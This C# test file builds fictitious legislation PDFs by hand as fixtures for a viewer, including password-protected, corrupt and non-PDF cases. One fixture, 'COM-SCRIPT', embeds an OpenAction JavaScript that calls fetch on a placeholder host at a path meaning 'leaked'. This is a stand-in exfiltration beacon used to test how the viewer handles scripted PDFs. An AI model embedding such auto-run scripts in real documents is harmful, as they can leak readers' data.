using System.Text;

namespace Pmvni.Legislacao.Testes.Ficticios;

/// <summary>PDFs fictícios para os testes e o roteiro, montados no código (sem biblioteca) com bytes fixos: PDF 1.4 com tabela
/// xref de verdade, Helvetica WinAnsi 12 pt, uma linha de texto por <c>Tj</c> (margem 72 pt, 18 pt entre linhas), marcadores
/// (/Outlines) quando pedidos. Nenhum conteúdo real: leis e normas inventadas ("LEI Nº 9.999… (FICTÍCIA)").</summary>
public static class PdfLegislacaoFicticio
{
    static readonly Encoding Win1252 = CriarWin1252();

    static Encoding CriarWin1252()
    {
        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
        return Encoding.GetEncoding(1252);
    }

    const string Lei = "MUNICIPAL/LEI 9.999-2099 - FICTICIA.pdf";
    const string Lei2 = "MUNICIPAL/LEI 9.999-2099 - FICTICIA (VERSAO 2).pdf";
    const string Nt = "ESTADUAL - CBMES/NT 99-2099 - FICTICIA.pdf";
    const string Federal = "FEDERAL/LEI 99.999-2099 - FICTICIA.pdf";
    const string Digitalizada = "OUTRAS/DIGITALIZADA - FICTICIA.pdf";
    const string Senha = "OUTRAS/SENHA - FICTICIA.pdf";
    const string Corrompido = "OUTRAS/CORROMPIDO - FICTICIA.pdf";
    const string NaoEPdf = "OUTRAS/NAO-E-PDF - FICTICIA.pdf";
    const string ComScript = "OUTRAS/COM-SCRIPT - FICTICIA.pdf";

    static readonly string[][] PaginasLei =
    [
        ["LEI Nº 9.999, DE 1º DE JANEIRO DE 2099 (FICTÍCIA)", "Art. 1º Esta Lei fictícia trata do afastamento frontal das edificações."],
        ["Art. 2º O afastamento frontal mínimo é de 3,00 m.", "Art. 3º A taxa de ocupação máxima é de 60%."],
        ["ANEXO I – QUADRO FICTÍCIO", "Zona ZR1: afastamento de 3,00 m e taxa de ocupação de 60%."],
    ];

    /// <summary>Arquivo (caminho relativo a tests/corpus/legislacao, com <c>/</c>) → páginas → linhas de texto.</summary>
    public static IReadOnlyDictionary<string, string[][]> Textos { get; } = new Dictionary<string, string[][]>
    {
        [Lei] = PaginasLei,
        [Lei2] = [.. PaginasLei, ["Art. 4º Artigo incluído na versão 2 (fictícia)."]],
        [Nt] =
        [
            ["NORMA TÉCNICA FICTÍCIA Nº 99/2099", "1 OBJETIVO"],
            ["5.1 O afastamento entre edificações fictícias é de 4,00 m."],
        ],
        [Federal] = [["LEI Nº 99.999, DE 2 DE JANEIRO DE 2099 (FICTÍCIA)", "Art. 1º Esta Lei federal fictícia trata do parcelamento do solo."]],
        [ComScript] = [["Página com script fictício."]],
    };

    /// <summary>Os 9 arquivos do corpus, por caminho relativo.</summary>
    public static IReadOnlyDictionary<string, byte[]> Todos { get; } = Montar();

    static Dictionary<string, byte[]> Montar()
    {
        var marcadoresLei = new (string Titulo, int Pagina)[] { ("Art. 1º", 1), ("Art. 2º", 2), ("Art. 3º", 2), ("Anexo I", 3) };
        return new Dictionary<string, byte[]>
        {
            [Lei] = Gerar(Textos[Lei], marcadoresLei),
            [Lei2] = Gerar(Textos[Lei2], [.. marcadoresLei, ("Art. 4º", 4)]),
            [Nt] = Gerar(Textos[Nt]),
            [Federal] = Gerar(Textos[Federal]),
            [Digitalizada] = Gerar([[]], retangulo: true),
            [Senha] = Gerar([["Conteúdo protegido fictício."]], criptografado: true),
            [Corrompido] = Encoding.ASCII.GetBytes("%PDF-1.4\n" + new string('x', 2048)),
            [NaoEPdf] = new UTF8Encoding(false).GetBytes("Arquivo de texto fictício, não é PDF.\n"),
            [ComScript] = Gerar(Textos[ComScript], script: true),
        };
    }

    /// <summary>PDF com <paramref name="n"/> páginas de uma linha cada ("Página i de n do PDF fictício grande."), para os testes de
    /// cancelamento e de tempo.</summary>
    public static byte[] GerarGrande(int n) =>
        Gerar([.. Enumerable.Range(1, n).Select(i => new[] { $"Página {i} de {n} do PDF fictício grande." })]);

    public static byte[] Gerar(string[][] paginas, (string Titulo, int Pagina)[]? marcadores = null,
        bool retangulo = false, bool criptografado = false, bool script = false, int bytesExtras = 0)
    {
        var pdf = new Corpo();
        var catalogo = pdf.Reservar();
        var arvore = pdf.Reservar();
        var fonte = pdf.Reservar();
        var info = pdf.Reservar();

        var objetosPagina = new int[paginas.Length];
        var objetosConteudo = new int[paginas.Length];
        for (var i = 0; i < paginas.Length; i++) { objetosPagina[i] = pdf.Reservar(); objetosConteudo[i] = pdf.Reservar(); }

        pdf.Definir(fonte, Latin("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>"));
        pdf.Definir(info, Latin("<< /Producer (PdfLegislacaoFicticio) /CreationDate (D:20990101000000Z) >>"));

        var anotacao = 0;
        if (script)
        {
            anotacao = pdf.Adicionar(Latin("<< /Type /Annot /Subtype /Link /Rect [72 700 220 720] /Border [0 0 0] "
                + "/A << /S /URI /URI (https://exemplo.invalid/) >> >>"));
        }

        for (var i = 0; i < paginas.Length; i++)
        {
            var conteudo = new StringBuilder();
            if (retangulo) conteudo.Append("0.5 g 72 600 200 100 re f\n");
            var bytesConteudo = new List<byte>(Latin(conteudo.ToString()));
            for (var l = 0; l < paginas[i].Length; l++)
            {
                bytesConteudo.AddRange(Latin($"BT /F1 12 Tf 1 0 0 1 72 {770 - 18 * l} Tm ("));
                bytesConteudo.AddRange(Escapar(paginas[i][l]));
                bytesConteudo.AddRange(Latin(") Tj ET\n"));
            }
            pdf.Definir(objetosConteudo[i], ComFluxo("", [.. bytesConteudo]));
            var anots = script && i == 0 ? $" /Annots [{anotacao} 0 R]" : "";
            pdf.Definir(objetosPagina[i], Latin($"<< /Type /Page /Parent {arvore} 0 R /MediaBox [0 0 595 842] "
                + $"/Resources << /Font << /F1 {fonte} 0 R >> >> /Contents {objetosConteudo[i]} 0 R{anots} >>"));
        }
        pdf.Definir(arvore, Latin($"<< /Type /Pages /Kids [{string.Join(" ", objetosPagina.Select(o => o + " 0 R"))}] /Count {paginas.Length} >>"));

        var extras = new StringBuilder();
        if (marcadores is { Length: > 0 })
        {
            var raiz = pdf.Reservar();
            var itens = marcadores.Select(_ => pdf.Reservar()).ToArray();
            for (var k = 0; k < marcadores.Length; k++)
            {
                var prev = k > 0 ? $" /Prev {itens[k - 1]} 0 R" : "";
                var next = k < marcadores.Length - 1 ? $" /Next {itens[k + 1]} 0 R" : "";
                pdf.Definir(itens[k], Latin($"<< /Title {TituloHex(marcadores[k].Titulo)} /Parent {raiz} 0 R{prev}{next} "
                    + $"/Dest [{objetosPagina[marcadores[k].Pagina - 1]} 0 R /Fit] >>"));
            }
            pdf.Definir(raiz, Latin($"<< /Type /Outlines /First {itens[0]} 0 R /Last {itens[^1]} 0 R /Count {marcadores.Length} >>"));
            extras.Append($" /Outlines {raiz} 0 R /PageMode /UseOutlines");
        }
        if (script)
            extras.Append(" /OpenAction << /S /JavaScript /JS (fetch\\('https://exemplo.invalid/vazou'\\);) >>");
        pdf.Definir(catalogo, Latin($"<< /Type /Catalog /Pages {arvore} 0 R{extras} >>"));

        if (bytesExtras > 0)
        {
            // Objeto solto (ninguém o referencia) só para engordar o arquivo: acima de 2 MB o PDF.js passa a ler por intervalos.
            var lixo = new byte[bytesExtras];
            new Random(20990101).NextBytes(lixo);
            pdf.Adicionar(ComFluxo("", lixo));
        }

        var trailer = $"/Root {catalogo} 0 R /Info {info} 0 R /ID [<00112233445566778899AABBCCDDEEFF><00112233445566778899AABBCCDDEEFF>]";
        if (criptografado)
        {
            // R 2 com /U que não confere (a senha de abertura vazia falha): o PDF.js pede senha.
            var o = new string('A', 64);
            var u = new string('B', 64);
            var enc = pdf.Adicionar(Latin($"<< /Filter /Standard /V 1 /R 2 /Length 40 /P -4 /O <{o}> /U <{u}> >>"));
            trailer += $" /Encrypt {enc} 0 R";
        }
        return pdf.Serializar(trailer);
    }

    static byte[] Latin(string s) => Encoding.Latin1.GetBytes(s);

    static byte[] ComFluxo(string dicionarioExtra, byte[] dados)
    {
        var lista = new List<byte>();
        lista.AddRange(Latin($"<< /Length {dados.Length}{dicionarioExtra} >>\nstream\n"));
        lista.AddRange(dados);
        lista.AddRange(Latin("\nendstream"));
        return [.. lista];
    }

    /// <summary>Texto em cp1252 dentro de uma string literal do PDF, com escape de <c>(</c>, <c>)</c> e <c>\</c>.</summary>
    static byte[] Escapar(string texto)
    {
        var saida = new List<byte>();
        foreach (var b in Win1252.GetBytes(texto))
        {
            if (b is (byte)'(' or (byte)')' or (byte)'\\') saida.Add((byte)'\\');
            saida.Add(b);
        }
        return [.. saida];
    }

    static string TituloHex(string titulo)
    {
        var sb = new StringBuilder("<FEFF");
        foreach (var c in titulo) sb.Append(((int)c).ToString("X4"));
        return sb.Append('>').ToString();
    }

    sealed class Corpo
    {
        readonly List<byte[]> objetos = [];

        public int Reservar() { objetos.Add([]); return objetos.Count; }
        public void Definir(int numero, byte[] corpo) => objetos[numero - 1] = corpo;
        public int Adicionar(byte[] corpo) { objetos.Add(corpo); return objetos.Count; }

        public byte[] Serializar(string trailer)
        {
            using var ms = new MemoryStream();
            void Escrever(byte[] b) => ms.Write(b);
            Escrever(Latin("%PDF-1.4\n"));
            Escrever([(byte)'%', 0xE2, 0xE3, 0xCF, 0xD3, (byte)'\n']);
            var posicoes = new long[objetos.Count];
            for (var i = 0; i < objetos.Count; i++)
            {
                posicoes[i] = ms.Position;
                Escrever(Latin($"{i + 1} 0 obj\n"));
                Escrever(objetos[i]);
                Escrever(Latin("\nendobj\n"));
            }
            var xref = ms.Position;
            var sb = new StringBuilder($"xref\n0 {objetos.Count + 1}\n0000000000 65535 f \n");
            foreach (var p in posicoes) sb.Append(p.ToString("D10")).Append(" 00000 n \n");
            sb.Append($"trailer\n<< /Size {objetos.Count + 1} {trailer} >>\nstartxref\n{xref}\n%%EOF\n");
            Escrever(Latin(sb.ToString()));
            return ms.ToArray();
        }
    }
}
